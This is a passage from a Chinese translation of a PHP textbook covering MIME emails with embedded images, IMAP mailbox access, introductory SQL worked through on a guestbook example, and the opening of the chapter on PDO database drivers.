    additional_headers: "MIME-Version: 1.0\nContent-type: multipart/mixed;
boundary=\"\\separator-0815\\\"");
?>
```

## 清单 16.5 带文件附件的邮件 ("mime2.php")

出于便利考虑，首先在 `$mailtext` 变量中放置文件的占位符。然后使用 `str_replace()` 将该占位符替换为 Base64 编码的文件内容。

![](img/ae7820c36e8f24c1623d26668b28e80e_517_0.png)

## 图 16.10 图形已作为附件添加到电子邮件

如图 16.10 所示，邮件程序仅将图形作为附件，而未直接显示它（Thunderbird 确实会呈现它，但会在实际邮件文本之后显示）。但是，有些场景确实希望集成图形。其中一个示例是 HTML 电子邮件。图形通常会集成其中（尤其是广告电子邮件，但那又是另一个话题）。实现此目的有两种方法：

- 使用绝对外部 URL：
  `src="http://server/name.gif" />`
- 集成到电子邮件中：
  `src="cid:ID_of_the_graphic" />`

`cid:ID_of_the_graphic` 格式已标准化。`cid:` 是固定的；您只需定义图形的 CID（内容 ID）。这也可以通过邮件标头完成。以下是示例：

```
From: sender@xy.zzz
To: recipient@xy.zzz
Subject: MIME message
MIME-Version: 1.0
Content-type: multipart/alternative; boundary="separator-0815"

Preamble that is not visible, except for very old clients

--separator-0815
Content-Type: text/html

<a href="http://www.php.net/"><img src="cid:PHPLogo" alt="PHP logo" /></a>
is great (see attachment)!
--separator-0815
Content-Type: image/gif; name="php.gif";
Content-Transfer-Encoding: base64
Content-ID: PHPLogo
Content-Disposition: attachment

MIME64encoded=
--separator-0815--
Credits, which are also not visible
```

相应调整代码所需的工作量很小。

```
<?php
$filecontent = base64_encode(file_get_contents("php.gif"));
$mailtext = 'Preamble, which is not visible, except for very old clients
--separator-0815
Content-Type: text/html

<a href="http://www.php.net/"><img src="cid:PHPLogo" alt="PHP logo" /></a>
is great!
--separator-0815
Content-Type: image/gif; name="php.gif";
Content-Transfer-Encoding: Base64
Content-Disposition: inline
Content-ID: PHPLogo

%%FILECONTENT%%
--separator-0815--
';
$mailtext = str_replace("%%FILECONTENT%%", $filecontent, $mailtext);
mail(to: "recipient@xy.zzz",
 subject: "MIME mail with attachment",
 message: $mailtext,
 additional_headers: "MIME-Version: 1.0\nContent-type: multipart/
alternative; boundary=\"separator-0815\"");
?>
```

## 清单 16.6 直接引用附加图形 ("mime3.php")

这应当结束关于 MIME 和 PHP“隐藏秘密”的探讨。您已了解如何或多或少轻松地创建不仅包含纯文本，还包含图形和文件附件的电子邮件。但是请注意，HTML 电子邮件占用的存储空间要大得多。此外，许多猖獗的电子邮件病毒得益于 HTML 电子邮件（或某些电子邮件客户端的错误实现）而能够轻易传播。因此，用户通常要么根本不打开 HTML 电子邮件，要么只读取备用文本消息版本。不幸的是，许多发件人忘记包含备用文本。因此，如果您必须使用 HTML 电子邮件，请使用 multipart/alternative，并同时创建电子邮件的文本版本。

> 注意
> 为了防止图 16.11 中的集成图形也显示为附件，您必须使用 multipart/alternative，如示例所示！

![](img/ae7820c36e8f24c1623d26668b28e80e_519_0.png)

图 16.11 带集成图形的邮件

### 16.2.3 IMAP 和 POP

为结束关于电子邮件的论述，我们将对电子邮件的管理和读取进行展望。为此存在多种协议——主要是 POP 和 IMAP。PHP 的 IMAP 扩展支持两者。但是，您必须先安装它。在 Unix/Linux 下，您需要来自 github.com/uw-imap/imap 的相应 C 库，必须对其进行编译，然后使用 `--with-imap=/directory/of/library` 配置开关将其集成到 PHP 中。Windows 用户向 php.ini 添加以下行：
extension = imap

在 `phpinfo()` 的输出中，将出现该库的条目（见图 16.12）。

> 注意
> 从 PHP 8.4 版本开始，IMAP 扩展将移至 PECL，并必须从此处获取（https://pecl.php.net/package/imap）；之后将不再自动包含在 PHP 发行版中。




![](img/ae7820c36e8f24c1623d26668b28e80e_520_0.png)

### 图 16.12 PHP IMAP 库已加载

例如，以下代码建立与 IMAP 服务器的连接并输出位于其中的所有邮件列表（参见图 16.13）。此处也适用同样的规则：所使用的凭据是虚构的；请使用您自己的凭据！

```php
<?php
$inbox = imap_open("{imap.xy.zzz:143}INBOX", "user", "password");
echo "<p><b>Email Headers</b><br />";
$mails = imap_headers($inbox);
foreach($mails as $key => $value) {
    echo htmlspecialchars($key) . ": " . htmlspecialchars($value) .
    "<br />";
}
echo "</p>";
imap_close($inbox);
?>
```

### 清单 16.7 查询 IMAP 邮箱 ("imap.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_520_1.png)

### 图 16.13 IMAP 邮箱的内容

# 第四部分

### 数据库

## 第 17 章 SQL

*没有 SQL 就没有数据库：多年来情况一直如此。即使现在有不支持 SQL 的数据库，大多数系统仍然依赖这种查询语言。这足以作为简要介绍的理由！*

起初……是 IBM。在 20 世纪 70 年代，IBM 开发了结构化英语查询语言（SEQUEL），这是一种可以用“英语”与数据库通信的查询语言。这就是 SQL，随后成为标准。术语一直是混淆的根源。许多程序员，尤其是年长的程序员，仍然把 SQL 读作 sequel，可能是因为他们还熟悉旧标准。另一些人认为 SQL 代表结构化查询语言（Structured Query Language）——但标准中并未提及这一点。因此 SQL 就是 SQL，既不多也不少。

相关标准版本是 SQL:1992（也称为 SQL-92）和 SQL:1999，以出版年份命名。最新版本是 SQL:2023，中间还有 SQL:2003、SQL:2006、SQL:2008、SQL:2011 和 SQL:2016。各种数据库对标准的实现程度一直各不相同。然而，对于基本任务（尤其是 Web 编程）来说，只需少数几个命令即可。

这就直接带到了主要限制：SQL 功能非常强大，在许多细节上，各个数据库（或更准确地说，数据库系统）的个别制造商都有各自的变体。因此，要以简洁的形式梳理所有差异非常困难。¹

在本书第四部分（从本章开始），您将找到关于所有主要数据库及如何使用 PHP 控制它们的信息。为此，我们将演示标准任务，介绍各个数据库的特殊功能，并（为了确保良好的可比性）在每章末尾提供一致的示例。在每一章中重复介绍 SQL 基础会有些枯燥。因此，我们采用了不同的方法：在本章中，您将学习 SQL 的所有基本内容。我们不声称内容全面，但读完本章后，您将拥有理解本章及后续所有其他数据库示例所需的工具。对于单个数据库的非常具体的细节，我们将您引向专业文献或相应产品的文档。本书主要讲解 PHP。

通常，您将在随所使用数据库提供的管理工具中输入本章中的代码；或者，也可以直接将 SQL 命令发送到数据库——当然是使用 PHP。如何操作，您可以在相应的数据库章节中找到。

### 17.1 创建数据库和表

开发人员常常谈论“一个数据库”，指的是例如 MySQL 或 MSSQL 的安装。然而，在关系数据库模型中，术语略有不同。数据库服务器——或数据库安装——可以包含多个数据库。这些数据库包含表。您可以将表视为类似于 Microsoft Excel 之类的电子表格：有列和行，每一行都是数据库中的一条条目。想象一下像表 17.1 那样的访客簿。可能的列包括做条目的人的姓名、他们的电子邮件地址、输入的文本以及条目的日期。这将是一个包含四个列的表。最好不要在列名中使用任何特殊字符；我们还实施一个约定，即只使用小写字母。

| 列名 | 描述 |
| :--- | :--- |
| name | 注册者的姓名 |
| email | 注册者的电子邮件地址 |
| date | 条目日期 |
| entry | 条目文本 |

表 17.1 表条目内容

### 17.1.1 主键

出于性能原因（以及其他原因，尤其是在关联多个表时），为表使用 *主键* 是常见做法。这是一个列²，其值在表中是唯一的。在访客簿的例子中，这看起来是什么样的？姓名和电子邮件地址都不是唯一的，因为任何人都可以发布多个条目。日期也不是唯一的；至少在理论上，两个条目可能同时到达数据库。甚至条目的文本也不是唯一的。那么，是否应该将所有条目的组合提升为主键？这可能太复杂，并且在某些极不可能的条件下仍然不是唯一的。因此，引入一个包含条目连续编号的新列已成为常见做法；这样可以确保唯一性。表 17.2 是更新后的形式。

| 列名 | 描述 |
|---|---|
| id | 条目编号，主键 |
| name | 注册者的姓名 |
| email | 注册者的电子邮件地址 |
| date | 条目日期 |
| entry | 条目文本 |

表 17.2 表 "entry" 的更新内容

大多数数据库为这种人工生成的主键提供单独的数据类型，所谓的自增值。每次向表中插入新数据记录时，自增值会增加 1。这样可以确保表中的每个新条目都有一个比前一个大 1 的新编号。在这方面您无需担心任何事情；数据库会处理一切。

### 17.1.2 数据类型

每个列都需要定义的数据类型。虽然也有（少数）数据库在内部仅使用字符串（SQLite 就是这种候选者），但数据库中的类型定义通常能确保性能大幅提升。SQL 标准定义了整个一系列数据类型，表 17.3 显示了最重要类型的相关选择。

| 数据类型 | 描述 |
|---|---|
| BLOB | 二进制大对象；（大）二进制数据 |
| BOOLEAN | 布尔值 |
| CHAR(length) | 固定长度字符串 |
| DATE | 日期值 |
| DECIMAL | 十进制值 |
| INT | 整数 |
| TIMESTAMP | 时间戳 |
| VARCHAR(length) | 可变长度字符串（括号内为最大长度） |

表 17.3 SQL 数据类型选集

每个数据库制造商可能在这一点上提供变体——例如，通过添加其他数据类型。同样适用于 Web 服务的互操作性：就易于移植而言，您最好只使用标准数据类型。

### 关于日期值的说明

在理论上，数据库中的日期值非常实用。它们以高性能存储，查询结果可以根据日期值方便地排序。例如，在访客簿中，可以按逆序输出所有条目，最新的条目排在最前面。但是，当将应用程序移植到另一个系统时，日期值也可能使开发人员的工作变得困难：不同的国家，不同的习惯，不同的日期格式。在欧洲大部分地区，2025 年除夕写作 31.12.2025，而北美使用格式 12/31/2025 或有时 12/31/2025。在这种情况下，日期仍然清晰，但臭名昭著的 4 月 1 日呢？4-1-2026 也许是 1 月 4 日？

虽然本书当然不涉及 ASP.NET Core，但与之相关的一个有教训的事件：Microsoft 委托开发了六个示例应用程序用于其 Web 脚本技术，以展示 .NET 编程范式的有教训的实现。不幸的是，这些应用程序似乎仅在英文系统上进行了测试，因为某些应用程序的数据库初始化脚本在德国版 Windows 上失败了。原因是日期格式不正确。

因此，作者倾向于不太愿意使用日期值，而是使用一个小技巧。用于接收日期的字段被创建为 CHAR(14)，并接收形式为 20251231123456 的时间戳。这对应于 2025 年除夕 12:34:56。这种特殊记法的优势在于：由于“最大”的值在前面，先是年份，然后是月份，然后是日期，依此类推，因此可以轻松按这些时间戳排序。而且 PHP 使创建这样的时间戳变得非常容易：

```
date("YmdHis")
```

或者，您也可以将日期保存为 ISO 格式，可以通过 date("c") 轻松获得：2025-12-31T12:34:56 +00:00。

使用 CREATE DATABASE SQL 命令（大写是惯例，但非强制）可以创建数据库，并使用 CREATE TABLE 创建表。在后一种情况下，您指定所有列名和数据类型。根据数据库的不同，自增值有不同的名称或数据类型——例如，AUTO_INCREMENT 或 IDENTITY(1)：

```sql
CREATE TABLE entry(
 id IDENTITY(1) PRIMARY KEY,
 name VARCHAR(100),
 email VARCHAR(100),
 date DATE,
 entry VARCHAR(1000)
)
```

1 试图完成这一任务的一本书是 O’Reilly 出版的《SQL in a Nutshell》。然而，这本强烈推荐的书的作者需要几百页来解释 Microsoft SQL Server、MySQL、Oracle 和 PostgreSQL 等之间 SQL 支持的细微但微妙的差别。

2 它也可以是多个列的组合。





> **注意**
> 
> 通常，所有数据库命令都以分号结束。不过，这通常仅在您想将多条语句打包到一条中时才相关。分号对于您也可以通过 PHP 发送到数据库的单个语句来说并非必需。

## 17.2 输入数据

将数据插入数据库的 SQL 命令是 `INSERT INTO <table name>`。接着输入要插入内容的列列表、关键字 `VALUES`，然后是值。字符串值用单引号括起来（尤其是日期值有不同的格式）！

```
INSERT INTO entry (name, email, date, entry) VALUES
('Christian',
'christian@xy.zzz',
'2025-01-01',
'Welcome to the guestbook! The guestbook is open. ')
INSERT INTO entry (name, email, date, entry) VALUES
('Tobias',
'tobias@xy.zzz',
'2025-01-02',
'This isn't exactly the place to be ... ')
INSERT INTO entry (name, email, date, entry) VALUES
('Christian',
'christian@xy.zzz',
'2025-01-03',
'There is some truth in that. ')
```

> **提示**
> 
> 还有一种简写形式：
> 
> `INSERT INTO <table name> VALUES (<value1>, <value2>, <value3>)`
> 
> 这里您只输入值，而不是列名。为此，您自然需要按正确顺序输入值，即按列定义的顺序。但是，在此示例中这样做不太实用，因为您不会手动填充 `id` 列，而是将填充工作留给数据库的自动值机制。或者，您可以传递一个空字符串。

## 17.3 查询数据

查询的最简单形式如下：

```
SELECT * FROM entry
```

此查询从（FROM）表中选择（SELECT）所有（*）内容并返回它（参见表 17.4）。

| 编号 | 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|---|
| 1 | Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |
| 2 | Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |
| 3 | Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |

表 17.4 "SELECT" 查询的结果

这很快、很简单——当然一点也不高效，因为真的返回了所有内容。

如果您只需要部分数据，则应明确指定想要的列。继续以留言簿为例：您不需要 id 字段即可输出所有条目：

```
SELECT name, email, date, entry FROM entry
```

| 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|
| Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |
| Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |
| Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |

表 17.5 "SELECT" 查询的结果

结果也可以排序。为此的 SQL 关键字是 ORDER BY，后跟要排序的列。还可以指定排序方向：ASC 表示升序（默认），DESC 表示降序：

```
SELECT name, email, date, entry FROM entry ORDER BY date DESC
```

| 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|
| Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |
| Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |
| Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |

表 17.6 "SELECT" 查询的结果

也可以按多个列排序。以下查询首先按投稿者姓名（升序）排序，然后按日期（降序）排序：

```
SELECT name, email, date, entry FROM entry ORDER BY name ASC, date DESC
```

| 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|
| Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |
| Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |
| Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |

表 17.7 "SELECT" 查询的结果

之前的查询始终返回表中的所有行。但通常，您只想查找所有数据中的某一部分。可以使用 `WHERE` 子句来实现这一点。其后，您需指定返回的数据必须满足的一个或多个条件。所有布尔表达式均可用，包括 OR 和 AND。以下是一个返回所有 Tobias 条目的查询示例（好吧，只有一条）：

```
SELECT * FROM entry WHERE name = 'Tobias'
```

| 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|
| Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |

表 17.8 "SELECT" 查询的结果

字符串比较通常 _区分大小写_；也就是说，会区分大写和小写。如果您不希望这样，则必须使用 `LIKE` 运算符，而不是相等运算符：

```
SELECT * FROM entry WHERE name LIKE 'tobiAS'
```

| 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|
| Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |

表 17.9 "SELECT" 查询的结果

使用 LIKE 时，还可以使用占位符和通配符：_ 代表任意字符，而 % 代表任意数量的字符：

```
SELECT * FROM entry WHERE name LIKE '%a_';
```

| 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|
| Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |
| Tobias | tobias@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |
| Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |

表 17.10 "SELECT" 查询的结果

返回了所有数据记录，因为 "Christian" 和 "Tobias" 均满足条件 '%a_'：末尾有任意数量的字符，接着是 "a"，然后是任意字符。

> **提示**
> 
> 如果使用 LIKE 时想要明确搜索字符 _ 或 %，必须将其放在方括号中。该语句返回所有包含百分号的条目：
> 
> `SELECT * FROM table WHERE column LIKE '%[%]%'`

出于性能考虑，如果 Web 应用程序不显示所有数据库条目，而只显示最近的条目，那么 PHP 代码自然只关心部分数据。不幸的是，各种数据库之间存在差异。每种数据库都支持返回前 X 条数据记录的功能，如表 17.11 所示。

| 数据库 | 命令 |
|---|---|
| MySQL | SELECT ... FROM ... LIMIT X |
| Microsoft SQL Server | SELECT TOP X ... FROM ... |
| Oracle | SELECT ... FROM ... WHERE ROWNUM <= X |
| SQLite | SELECT ... FROM ... LIMIT X |

表 17.11 不返回所有数据的 SQL 命令

## 17.4 更新数据

更新数据的 SQL 命令称为 UPDATE <table name>。然后输入关键字 SET 以及要更改的值，形式为 <column>=<value>。但这样会更改表中的所有行。因此，您通常还需要一个 WHERE 子句。以下是一个更改 Tobias（虚构）电子邮件地址的示例：

```
UPDATE entry SET name = 'Tobi', email = 'tobi@xy.zzz'
WHERE name = 'Tobias'
SELECT * FROM entry
```

| 编号 | 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|---|
| 1 | Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |
| 2 | Tobi | tobi@xy.zzz | 2025-01-02 | 这里可能不是您想待的地方…… |
| 3 | Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |

表 17.12 执行 "UPDATE" 后的 "SELECT" 查询结果

## 17.5 删除数据

数据——甚至数据库——也可以快速删除。例如，Tobias 可能对数据库中自己的昵称（或其一条条目）不满意（或感到羞愧），并希望删除该条目。可以使用 DELETE FROM <table name> 来实现。如果只发出此命令，则会删除所有数据。因此，在此使用 WHERE 子句限制要删除的结果集非常重要：

```
DELETE FROM entry WHERE name = 'Tobi'
SELECT * FROM entry
```

| 编号 | 姓名 | 电子邮件 | 日期 | 条目 |
|---|---|---|---|---|
| 1 | Christian | christian@xy.zzz | 2025-01-01 | 热烈欢迎！留言簿已开放。 |
| 3 | Christian | christian@xy.zzz | 2025-01-03 | 这有一定道理。 |

表 17.13 执行 "DELETE" 后的 "SELECT" 查询结果

> **注意**
> 也可以删除整个表：
> DROP TABLE entry





## 17.6 特殊功能

这就是 SQL 的全部内容。现在你可以在 Web 上执行几乎所有标准任务。本节展示了一些更高级的技术。

### 17.6.1 关系型数据库设计

到目前为止，我们的设置相对简单：一个表包含了所有数据。然而，你可能注意到表中的某些信息被重复了。例如，你可以看到两位留言本留言者的姓名和电子邮件地址一遍又一遍地被输入。这被称为*冗余*。如果这些数据存储在另一个表中，将更高效。每个条目都有一个主键。制作条目的人的这个"外部"主键随后将用于表*entry*中。因此，这被称为*外键*。

> **注意**
> 
> 当然，这是一个非常人为的例子：你需要一种特殊的留言本，其中只有登录并注册的用户才被允许写入条目。否则，无法判断由"Christian"写的两条条目是否来自同一个人。

因此，我们有两个表，一个用于条目（参见表 17.14），一个用于用户（参见表 17.15）。

| 列名 | 描述 |
|---|---|
| id | 条目编号，主键 |
| date | 条目日期 |
| entry | 条目文本 |
| user_id | 用户 ID，外键 |

表 17.14 表 "entry" 的内容

| 列名 | 描述 |
|---|---|
| id | 用户编号，主键 |
| name | 用户姓名 |
| email | 用户电子邮件地址 |

表 17.15 表 "user" 的内容

> **注意**
> 每个数据库管理员都有自己为表的自动值命名的方案。有些人总是使用 id，而其他人使用 <table name>_id（即，在示例中，entry_id 和 user_id）。

这些表通过外键相互关联。这就是为什么这被称为_关系数据模型_。这种关系也可以在各种数据库系统的图形管理工具中显示。图 17.1 显示了数据库设计器中的（简化的）表布局。连接线显示外键。

![](img/ae7820c36e8f24c1623d26668b28e80e_533_0.png)

### 图 17.1 两个表之间的关系

是时候再次向这些表中填充数据了：

```sql
INSERT INTO user (name, email) VALUES
('Christian',
'christian@xy.zzz')
```

```sql
INSERT INTO user (name, email) VALUES
('Tobias',
'tobi@xy.zzz')
```

```sql
INSERT INTO entry (user_id, date, entry) VALUES
(1,
'2025-01-01',
'Welcome! The guestbook is open. ')
```

```sql
INSERT INTO entry (user_id, date, entry) VALUES
(2,
'2025-01-02',
"It's not exactly the punk scene here ... ")
```

```sql
INSERT INTO entry (user_id, date, entry) VALUES
(1,
'2025-01-03',
'There is some truth in this. ')
```

### 17.6.2 连接

新的数据库设计提供了概念上的优势，但某些查询现在更加困难。例如，获取 Christian 写的所有条目（日期、文本）会很有趣。当然，你从之前的代码中知道 Christian 的 ID 是 1，但使用通用查询这并不那么容易。

解决此问题的一个简单方法是启动两个查询：首先确定 Christian 的 ID，然后从此值构建相应的 SELECT 命令。但你也可以使用单个语句。为此，必须将两个表连接在一起。有多种类型的连接（内连接、外连接、左连接、右连接），但这里只讨论最重要的几种。以下 SELECT 查询确定 Christian 的所有条目：

```sql
SELECT date, entry FROM entry, user
WHERE entry.user_id = user.id AND
user.name = 'Christian'
```

因此，表 entry 和 user 已经链接。连接条件是表 entry 中的用户 ID（外键）是表 user 中的主键。你必须在 FROM 之后指定表 user，即使你不直接从表中读取值——你在 WHERE 条件列表中使用此表。你还必须用点语法写非唯一列名（例如 "id"）：<table>.<column>。在我们看来，这种连接形式最直观（这称为 θ 样式）。然而，有一个稍长的版本：

```sql
SELECT id, date, entry FROM entry
JOIN user ON entry.user_id = user.id
WHERE user.name = 'Christian'
```

| id | date | entry | user_id |
|---|---|---|---|
| 1 | 2025-01-01 | 热烈欢迎！留言本已开放。 | 1 |
| 3 | 2025-01-03 | 这有一定道理。 | 1 |

表 17.16 “SELECT”查询的结果

### 17.6.3 聚合函数

SQL 还提供了一些特殊函数，可返回关于所有数据的有用信息。使用 COUNT，可以计算列中的值的数量：

```sql
SELECT COUNT(*) FROM entry
```

这将返回 3，因为表中有三个条目。你还可以在括号中指定列名，在这种情况下，除 NULL 之外的所有值都将被计数。

一种特殊形式是 COUNT DISTINCT。这将计算不同值的数量：

```sql
SELECT COUNT(DISTINCT user_id) FROM entry
```

这里我们得到值 2，因为表中的三个条目来自两个不同的人。还有几个这样的*聚合函数*，但这些仅与数值相关。例如，MIN 和 MAX 返回列的最小值和最大值，SUM 返回总和，AVG 返回平均值。

结合用于分组结果的 GROUP BY，你也可以掌握更复杂的查询。这里有一个任务：确定所有留言本成员的姓名及其条目数量。像往常一样使用 JOIN 查询数据库，然后按名称分组。条目数量随后会被汇总并按组显示：

```sql
SELECT user.name, COUNT(entry.user_id) FROM entry
JOIN user ON entry.user_id = user.id
GROUP BY user.name
```

| user.name | COUNT(entry.user_id) |
| :--- | :--- |
| Christian | 2 |
| Tobias | 1 |

表 17.17 “SELECT”查询的结果

### 注意：别名

为了节省输入，有一个缩写选项。在所有表的 FROM 列表中以及在 JOIN 中，你可以在表名后输入短形式，并在语句的任何地方使用此形式：

```sql
SELECT b.name, COUNT(e.user_id) FROM entry e
JOIN user b ON e.user_id = b.id
GROUP BY b.name
```

你可以在 SELECT 查询中为列名使用另一种形式的别名。输出（另请参见 [表 17.17](#）始终包含列名或聚合函数的名称。在使用 PHP 控制时，这可能很麻烦。因此，你可以使用 AS 关键字指定实用别名名称：

```sql
SELECT b.name AS Name, COUNT(e.user_id) AS Quantity FROM entry e
JOIN user b ON e.user_id = b.id
GROUP BY b.name
```

| Name | Quantity |
| :--- | :--- |
| Christian | 2 |
| Tobias | 1 |

表 17.18 “SELECT”查询的结果

### 17.6.4 事务

想象你在银行工作，负责网上银行，并通过 SQL 数据库管理用户账户。当用户登录并进行转账时，你的代码中可能发生以下情况：

```
SELECT balance FROM accounts WHERE owner = 'Christian'
If balance >= amount Then
    UPDATE accounts SET balance = balance - amount
    WHERE owner = 'Christian'
```

这是一个好计划，但如果一个狡猾的用户登录两次并几乎同时执行转账，它可能会失败。然后可能会先执行两个 SELECT 命令，接着执行 UPDATE 命令。如果你的账户中还有 30 美元，你可以转账 20 美元两次。

出于这个原因，有时将多个 SQL 语句作为一个单元一起执行非常重要。这个单元称为事务。

事务依赖于 ACID 原则。ACID 原则描述了事务必须满足的四个条件：

- 原子性  
  要么执行完整的事务，要么什么都不做。不可能采取"半吊子"措施。

- 一致性  
  事务前后数据库都处于有效状态（不违反外键条件等）。

- 隔离性  
  事务在隔离状态下进行；也就是说，事务的中间状态无法从外部查看，只能查看初始状态和最终状态。

- 持久性  
  一旦事务成功完成，更改即为永久性。

并非所有数据库都支持事务，而且依赖事务并不总是有意义的，因为它们通常需要更多的性能。以下事务一次插入两个数据库条目：

```sql
BEGIN TRANSACTION
INSERT INTO entry (user_id, date, entry) VALUES
(2,
'2025-01-04',
'Then do something about it! ')
INSERT INTO entry (user_id, date, entry) VALUES
(1,
'2025-01-05',
```



'我们可以发布你的童年照片吗？另一方面……')
COMMIT
GO

执行 COMMIT 和 GO 时，更改会被发送到数据库。大多数数据库使用自动提交；也就是说，所有 SQL 命令都会直接发送到数据库。不过，这种行为可以更改。COMMIT 的对应操作是 ROLLBACK，它会撤销已执行的事务步骤。

### 17.6.5 存储过程

另一个许多数据库不支持的特殊功能是存储过程（嵌入式过程）。其背后的理念是将程序逻辑从应用程序中提取出来，放置到数据库中。过程——函数——存储在数据库中。随后可以从外部调用这些过程。这对于 Web 应用程序的安全性也很实用：PHP 应用程序没有对数据库的写入权限，但可以执行预定义的存储过程。以下是将数据写入数据库的示例：

```
CREATE PROCEDURE sp_addentry (
    @user INT,
    @entry VARCHAR(50)
) AS
INSERT INTO entry (user_id, entry, date) VALUES
    (@user, @entry, getdate())

GO
```

存储过程的参数可以在过程中按其名称使用。

> **提示**
> SQL 命令中使用的 getdate() 函数是某些数据库集成的函数，用于返回当前日期。

这为你初步了解数据库编程提供了认识。本章中展示的 SQL 命令使你能够创建标准应用程序及更多内容。接下来的章节中你会看到此处展示的许多元素。还会再次出现留言本示例——但为了简单起见，只包含一个表。

# 第 18 章

# PDO

一个接口对应所有数据库：这就是 PDO 的承诺。它让你通过标准化的 API 访问（几乎）所有数据库。

在转向与 PHP 一起使用的“主要数据库”之前，我们将首先展示一种通用方法。在 PHP 中，网上有各种所谓的数据库抽象类。原则上，这是一种非常合理的方法：MySQL、SQLite、Microsoft SQL Server、Oracle、PostgreSQL 等各个模块的行为相似，但并不完全相同。控制方面始终存在微小差异——包括当然不同的名称。这本身不是问题。然而，当数据库更换时，情况就会变得困难。使用数据库特定模块时，现在很大程度上需要重新编程。使用抽象类则不同。在这里，你只需更改数据库名称和类型；应用程序的其余部分将像以前一样继续运行。1

那么抽象类是哲人之石，而特定模块实际上根本不推荐吗？不幸的是，并非如此。和许多其他地方一样，在 PHP 中特别是 Web 开发中，这在很大程度上取决于项目的要求。以下论点有时可以强烈反对使用抽象类：

- 如果没有长期计划迁移到其他数据库系统，那么使用抽象类不值得。不过要意识到，这可能只适用于少数应用程序。例如，如果你的主机从 MySQL 切换到 SQLite（当然，这是一个不切实际的假设），你该怎么办？如果主机的 SQLite 套餐比 Oracle 套餐便宜得多（一个稍微现实一些的假设），你该怎么办？

- 几乎所有抽象类都是用 PHP 编写的，因此在实际 PHP 代码和数据库特定 PHP 模块之间放置了一个需要解释的层。换句话说：抽象类可能会很慢。

- 由于抽象类中必须为 PHP 中的查询缓存数据，例如，这些类通常比直接使用 PHP 模块更耗资源。

1 诚然，这是一种愿望思维，因为 SQL 代码中的细微差别经常会发生变化——因此即使使用抽象类，切换到不同的数据库系统也不总是毫无痛苦。

- 抽象类代表了各种受支持数据库的一种“最小公约数”。因此，单个 PHP 模块的特定有用功能将被舍弃。

正如你所见，这完全取决于你想要实现什么。在本章中，我们介绍直接集成到 PHP 中的数据库抽象模块：PDO。

Wez Furlong（前“PECL 之王”）、Marcus Boerger、Ilia Alshanetsky 和 George Schlossnagle 曾联手开发了 PHP Data Objects（PDO）。这是一个 PECL 模块（即用 C 编写），为所有受支持的数据库提供标准化访问。中期目标是让 PDO 成为 PHP 的标准数据访问层，然后在内部将数据库调用重定向到相应的数据库特定函数。

## 18.1 准备工作

你可以直接使用 PDO；它随 PHP 一起提供。但是，仅凭这一点并没有多大用处，因为你还需要针对数据库系统的驱动程序。在出版时，可用的选项如下：

- PDO_4D (http://pecl.php.net/package/PDO_4D) 用于 4D SQL 数据库
- PDO_CUBRID (http://pecl.php.net/package/PDO_CUBRID) 用于 CUBRID 数据库
- PDO_IBM (http://pecl.php.net/package/PDO_IBM) 用于 IBM 数据库
- PDO_INFORMIX (http://pecl.php.net/package/PDO_INFORMIX) 用于 Informix 数据库
- PDO_SQLANYWHERE (http://pecl.php.net/package/PDO_SQLANYWHERE) 用于 Sybase 的 SAP SQL Anywhere
- PDO_SQLSRV (http://pecl.php.net/package/PDO_SQLSRV) 用于通过 ODBC 的 Microsoft SQL Server

这些包也可以使用 pecl install <package name> 进行安装。

其他 PDO 驱动程序随 PHP 一起提供，可以通过 php.ini 中的 extension=<package name> 进行安装：

- PDO_FIREBIRD 用于 Firebird
- PDO_MYSQL 用于 MySQL
- PDO_OCI 用于 Oracle
- PDO_ODBC 用于 ODBC 数据源

2 有时还需要 -f 开关，以便安装尚未标记为稳定的版本。对于 Windows，相应的数据库描述中可能会有单独的安装说明，甚至是对现有二进制文件的引用。

- PDO_PGSQL 用于 PostgreSQL
- PDO_SQLITE 用于 SQLite

一个特殊情况是 PDO_DBLIB，一个用于 Microsoft SQL Server 的 PDO 驱动程序。在 Windows 上，它偏偏无法工作；但是，来自 Microsoft 的替代开源驱动程序可用（另请参见第 21 章）。

> **注意**
> 
> 驱动程序需要 PDO 包作为先决条件。在早期的 PHP 版本中，你仍需通过 *extension=pdo* 将其包含在 *php.ini* 中。由于 PDO 已存在，这不再是必需的。但是，你仍然需要安装所需的驱动程序并将其添加到 *php.ini* 中。

Windows 用户（对于大多数驱动程序）有一个几乎更方便的选项。二进制分发版本已经包含了以下名称的相应 DLL 文件：

- php_pdo_firebird.dll
- php_pdo_mysql.dll
- php_pdo_oci.dll
- php_pdo_odbc.dll
- php_pdo_pgsql.dll
- php_pdo_sqlite.dll

安装过程在那里像往常一样通过 *extension=pdo_xxx* 进行。

如果你想稍后安装驱动程序，可以通过 *php.ini* 进行，或者在 Unix/Linux 下使用相应的配置开关：

```
--with-pdo<database type>
```

> **注意**
> 
